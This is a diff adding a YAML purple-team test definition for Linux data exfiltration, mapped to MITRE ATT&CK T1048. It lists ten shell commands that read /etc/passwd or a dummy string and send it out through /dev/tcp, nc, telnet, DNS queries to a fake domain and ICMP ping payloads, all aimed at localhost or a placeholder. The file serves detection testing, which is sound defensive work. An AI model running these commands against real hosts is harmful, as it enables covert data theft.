@@ -1,0 +1,25 @@
+enabled: true
+meta:
+  author: paragonsec
+  created: 2018-03-23
+  decorations:
+  - Purple Team
+  description: Linux Data Exfiltration
+  link: https://attack.mitre.org/wiki/Technique/T1048
+  mitre_technique_id: T1048
+  mitre_attack_phase: Exfiltration
+  mitre_attack_technique: Exfiltration Over Alternative Protocol
+  purple_actions:
+    1: echo "super_secret_data" > /dev/tcp/127.0.0.1/5555
+    2: echo "super_secret_data" | base64 > /dev/tcp/127.0.0.1/5555
+    3: echo "super_secret_data" > /bin/nc 127.0.0.1 80
+    4: echo "super_secret_data" | base64 > /bin/nc 127.0.0.1 80
+    5: cat /etc/passwd | telnet 127.0.0.1 5555
+    6: cat /etc/passwd | base64 | telnet 127.0.0.1 5555 
+    7: for line in `cat /etc/passwd `; do dig $line.fakedomain.local; done
+    8: base64 /etc/passwd | xxd -ps -c 16 |while read i; do ping -c1 -s32 -p $i 127.0.0.1;done
+    9: cat /etc/passwd | xxd -p -c 2 | xargs -n 1 -I '{}' ping -c 1 -t 1 -p '{}' 127.0.0.1 ; ping -c 1 -t 1 -s 55 127.0.0.1
+    10: for line in `gzip -c /etc/passwd | xxd -p -`; do dig $line.fakedomain.local @127.0.0.1;done
+os: linux
+name: Linux Data Exfiltration
+uuid: f784f31e-b6ff-4391-951c-dacabaff2782
